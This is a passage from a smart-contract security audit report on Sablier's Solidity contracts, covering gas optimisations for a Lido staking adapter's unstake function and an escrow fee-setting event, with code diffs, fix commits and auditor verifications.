This low-level call pattern also avoids return-bomb attacks but that isn't an issue here.

**Sabler:**
Acknowledged.


### `SablierLidoAdapter::unstakeFullAmount` should return `totalWstETH`

**Description:** `SablierBob::_unstakeFullAmountViaAdapter` always calls `SablierLidoAdapter::getTotalYieldBearingTokenBalance` then `SablierLidoAdapter::unstakeFullAmount`:

* `SablierLidoAdapter::getTotalYieldBearingTokenBalance` just reads and returns `_vaultTotalWstETH[vaultId]`
* the first thing `SablierLidoAdapter::unstakeFullAmount` does is perform an identical storage read of `_vaultTotalWstETH[vaultId]`

This is inefficient; there are two identical storage reads and one redundant external call. Simply have `SablierLidoAdapter::unstakeFullAmount` return `_vaultTotalWstETH[vaultId]`:
```diff
    function unstakeFullAmount(uint256 vaultId)
        external
        override
        onlySablierBob
-       returns (uint128 amountReceivedFromUnstaking)
+       returns (uint128 totalWstETH, uint128 amountReceivedFromUnstaking)
    {
        // Get total amount of wstETH in the vault.
-       uint128 totalWstETH = _vaultTotalWstETH[vaultId];
+       totalWstETH = _vaultTotalWstETH[vaultId];
```

Then change `SablierBob::_unstakeFullAmountViaAdapter` to use it:
```diff
    function _unstakeFullAmountViaAdapter(uint256 vaultId) private returns (uint128 amountReceivedFromAdapter) {
        Bob.Vault storage vault = _vaults[vaultId];

-       // Get the total amount staked via the adapter.
-       uint128 amountStakedViaAdapter = vault.adapter.getTotalYieldBearingTokenBalance(vaultId);

        // Interaction: unstake all tokens via the adapter.
-       amountReceivedFromAdapter = vault.adapter.unstakeFullAmount(vaultId);
+       uint128 amountStakedViaAdapter;
+       (amountStakedViaAdapter, amountReceivedFromAdapter) = vault.adapter.unstakeFullAmount(vaultId);

        // Log the event.
        emit UnstakeFromAdapter(vaultId, vault.adapter, amountStakedViaAdapter, amountReceivedFromAdapter);
    }
```

**Sablier:** Fixed in commit [d812e23](https://github.com/sablier-labs/lockup/commit/d812e2325975748019f5108f5fa87070e92fa753).

**Cyfrin:** Verified.


### Use `msg.sender` instead of accessing `comptroller` state variable to save gas

**Description:** Event `SetTradeFee` in `SablierEscrow` should use `msg.sender` (`CALLER` opcode = 2 gas) instead of accessing the comptroller storage variable (`SLOAD` opcode = 100 gas) to save gas. Since the function can only be called by the `comptroller`, using `msg.sender` is safe.

```solidity
function setTradeFee(UD60x18 newTradeFee) external override onlyComptroller {

        ... ... ...

        // Log the event.
        emit SetTradeFee(address(comptroller), previousTradeFee, newTradeFee);
    }
```

**Recommended Mitigation:** Use `msg.sender` in the event emission instead.

**Sablier:** Fixed in commit [c94cb23](https://github.com/sablier-labs/lockup/commit/c94cb232b62c188e2a1b23ab625bfd5374b92d7a#diff-ba86d209aeed90bf0447759321f08154ad7e0f4edc85849136cba83e27281fbbR162-R280).

**Cyfrin:** Verified.

\clearpage